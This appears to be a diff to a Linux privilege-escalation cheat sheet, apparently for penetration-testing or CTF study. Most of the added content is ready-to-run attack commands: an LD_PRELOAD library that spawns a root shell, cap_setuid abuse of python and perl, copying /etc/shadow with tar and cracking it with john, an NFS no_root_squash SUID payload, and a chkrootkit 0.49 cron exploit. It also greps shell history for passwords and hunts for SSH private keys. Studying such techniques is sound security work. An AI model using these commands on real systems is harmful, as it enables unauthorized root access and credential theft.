@@ -14,10 +14,13 @@ Simple and accurate guide for linux privilege escalation tactics
 - Sudo LD_PRELOAD
 - SUID / GUID Binaries
 - Capabilities
+- NFS Root Squashing
+- chkrootkit 0.49
 - Cron Jobs
 - Running Processes
-- NFS Root Squashing
+- Cron Jobs
 - Tmux
+
 
 
 # Basic System Enumeration
@@ -41,6 +44,7 @@ Structure : Linux Command // <Comment / Tip>
 ```
 history // Any clear-text credentials? Any command for logging into services with the credentials?
 cat /home/<user>/.bash_history // Can we see CLI history of other users?
+cat ~/.bash_history | grep -i passw // Any clear-text credentials?
 
 ```
 
@@ -95,8 +99,10 @@ If write access is enabled on /etc/sudoers | Add new sudo entry
 # SSH Private Keys 
 
 Structure : Linux Command / <Comment / Tip>
+
 ```
-find / -name id_rsa 2> /dev/null // Any SSH private keys? 
+find / -name authorized_keys 2> /dev/null              // Any Public Keys?
+find / -name id_rsa 2> /dev/null                       // Any SSH private keys? 
 
    Copy id_rsa contents of keys found with the above command
    Create a local file on your box and paste the content in
@@ -280,13 +286,11 @@ vi priv.c
 #include <sys/types.h>
 #include <stdlib.h>
 
-void _int() {
-
- unsetenv("LD_PRELOAD");
- setgid(0);
- setuid(0);
- system("/bin/bash");
-
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
 }
 
 Compile priv.c: gcc -fPIC -shared -o priv.so priv.c -nostartfiles
@@ -313,6 +317,106 @@ find / -uid 0 -perm -4000 -type f 2>/dev/null // Any Intresting binaries for SUI
 Create a Simple Basic SUID binary
 
 ---------------------------------------------------------------------
+
+
+```
+
+# Capabilities
+Python
+
+```
+getcap -r / 2>/dev/null         
+/usr/bin/python2.6 = cap_setuid+ep
+/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+id && whoami
+
+OR
+
+getcap -r / 2>/dev/null  
+/usr/bin/python3 = cap_setuid+ep
+/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+id && whoami
+
+```
+
+Perl
+
+```
+getcap -r / 2>/dev/null         
+/usr/bin/perl = cap_setuid+ep
+/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
+id && whoami
+
+```
+
+Tar
+
+```
+Victim
+
+getcap -r / 2>/dev/null         
+/usr/bin/tar = cap dac read search+ep
+/usr/bin/tar -cvf shadow.tar /etc/shadow
+/usr/bin/tar -xvf shadow.tar
+cat etc/passwd
+Copy content of users accounts to a local file called shadow
+
+Attacker
+
+john shadow --wordlist=/usr/share/wordlists/rockyou.txt
+Crack root's credentials
+
+Victim
+
+su root
+id && whoami
+
+
+```
+
+# NFS Root Squashing
+
+```
+
+Victim
+
+cat /etc/exports             // Do we see any no_root_squash enabled on a mounted share?
+
+/tmp *(rw,sync,insecure,no_root_squash,no,subtree,check)  
+
+Attacker
+
+showmount -e <victim_ip>                        // Do we see the /tmp share? // Replace Victim IP
+mkdir /tmp/mount                                // Create new local mounted share
+mount -o rw,vers=2 <victim_ip>:/tmp /tmp/mount  // Replace Victim IP
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mount/priv.c  
+gcc /tmp/mount/priv.c -o /tmp/mount/priv
+chmod +s /tmp/mount/priv
+
+Victim
+
+cd /tmp
+./priv
+id && whoami
+
+```
+
+# chkrootkit 0.49
+
+```
+Expliot: https://www.exploit-db.com/exploits/33899
+
+cat /etc/cron.daily
+
+/usr/bin/chkrootkit
+ls -la /usr/bin/chkrootkit     // Do we have SUID?
+chkrootkit -V
+echo "#!/bin/bash" > /tmp/update
+echo "chmod +s /bin/bash" >> /tmp/update
+Wait a While ...
+/bin/bash -p
+id && whoami
+
 
 
 ```
